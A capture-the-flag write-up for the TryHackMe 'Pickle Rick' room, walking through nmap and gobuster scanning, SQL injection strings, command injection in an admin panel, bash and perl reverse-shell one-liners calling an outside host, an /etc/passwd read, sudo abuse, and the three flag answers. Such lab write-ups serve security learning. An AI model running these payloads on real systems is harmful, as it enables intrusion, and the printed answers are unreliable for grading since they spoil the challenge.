# [TryHackMe | Pickle Rick](https://tryhackme.com/room/picklerick)

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

# Scanning Steps :

## STEP 1 :

View Source code :

```bash
    Note to self, remember username!
    Username: R1ckRul3s
```

## STEP 2 :

Checking robots.txt :

```bash
Wubbalubbadubdub
```
## STEP 3 :

Checking Ports open :

```bash
nmap -h
nmap -p- -sV -sC $IP
```
Nmap output :

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-20 21:35 CET
Nmap scan report for 10.10.62.191
Host is up (0.091s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 eb:87:4a:12:38:79:d8:04:cf:c7:8e:8e:87:ae:9c:39 (RSA)
|   256 92:3a:1b:52:29:9a:7a:cf:95:64:b3:3b:59:a7:99:ad (ECDSA)
|_  256 9e:a8:4e:fc:df:67:37:5b:08:7e:23:98:86:9a:80:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds

```
**Ubuntu 4ubuntu2.6**

**Port 80 HTTP**

**Port 22/TCP**

Could be Command Injection Exploit.

## STEP 4 :

Fetching Directories using Gobuster

```bash
gobuster -u $IP -w /path/wordlists/txt
```
**Login.php**

**Index.php**


## STEP 5 :

Checking for **Sql injection** on **POST** request **Login.php**

```bash
1' OR '1'='1
```
```bash
1' --
```

```bash
1' #
```

```http
POST /login.php HTTP/1.1
Host: 10.10.62.191
Content-Length: 41
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.62.191
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.62.191/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=d85ms1102h7qnofpd39gceb030
Connection: close

username=R1ckRul3s&password=1sdfsub=Login
```
## STEP 6 :
Checking with username=**R1ckRul3s** and password=**Wubbalubbadubdub**

**LOGIN SUCCESS** 


# Exploiting Steps :

I can execute **OS Commands** in **admin panel**.

## [Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)

Command injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS). Typically, the threat actor injects the commands by exploiting an application vulnerability, such as insufficient input validation.

Also Trying to **Upload or Execute REVERSE SHELL**

## STEP 1

Checking the command injection

```bash
whoami
```
```bash
pwd
```
```bash
cat ../../../etc/passwd
```

**EXECUTION SUCCESS**

## STEP 2

Starting **Reverse Shell** on **Port 4444**


```bash
nc -nvlp 4444
```

```bash
Listening on 0.0.0.0 4444
```

## STEP 3

Trying Payloads bash,perl..

**BASH Payload**
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

**PERL Payload**
```perl
perl -e 'use Socket;$i="$MYIP";$p=4444-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Python Payload**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```

There is Also **Ruby** - **Java** -  **Netcat** -  **Xterm** Payloads [LINKS Cheat sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet "CI Cheat sheet").

**THE PERL SHELL EXECUTED**

## STEP 4

Checking Connection and connection to **Host OS**

```bash
onnection received on $IP 55412
```

**Checking Commands Previleges**
```bash
$ sudo -l
```

```bash
Matching Defaults entries for www-data on
    ip-10-10-62-191.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-62-191.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL

```

**(ALL) NOPASSWD: ALL**

**Listing Files and Found the first flag**
```bash
$ ls
```

```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

```bash
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

```bash
$ cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
$ cat clue.txt
Look around the file system for the other ingredient.

```

Look around **The file system** for the other ingredient.

[Explaining what are the File system](https://www.linux.com/training-tutorials/linux-filesystem-explained/)

Find your system tree.
```bash
sudo apt install tree
tree -L 1 /
```

## STEP 5

Checking File system and user folders.

```bash
$ cd /home/$USER
$ ls
```
```bash
second ingredients
$ cat 'second ingredients'
1 jerry tear
```

**Found the 2nd Flag**


## STEP 6

I can run **sudo command** so i can check **root folder**.

```bash
$ sudo ls /root/
3rd.txt
snap
$ sudo cat /root/3rd.txt
3rd ingredients: fleeb juice

```

**Found the 3rd Flag.**
